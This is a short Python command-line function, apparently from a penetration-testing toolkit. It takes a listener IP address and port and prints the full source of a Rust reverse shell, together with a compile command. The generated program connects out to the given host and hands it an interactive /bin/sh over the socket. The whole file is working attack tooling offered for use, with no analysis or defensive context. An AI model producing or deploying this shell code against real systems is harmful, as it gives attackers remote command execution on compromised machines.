import click
from colorama import Fore

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print source only (no label).")
def command(listener_ip, listener_port, raw):
    """Return Rust reverse shell source code. Compile with: rustc shell.rs -o shell"""
    src = f"""use std::net::TcpStream;
use std::os::unix::io::{{AsRawFd, FromRawFd}};
use std::process::{{Command, Stdio}};

fn main() {{
    let s = TcpStream::connect("{listener_ip}:{listener_port}").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe {{ Stdio::from_raw_fd(fd) }})
        .stdout(unsafe {{ Stdio::from_raw_fd(fd) }})
        .stderr(unsafe {{ Stdio::from_raw_fd(fd) }})
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}}"""
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Rust reverse shell (compile: rustc shell.rs -o shell):\n{Fore.WHITE}{src}")
    else:
        click.secho(src, nl=False)
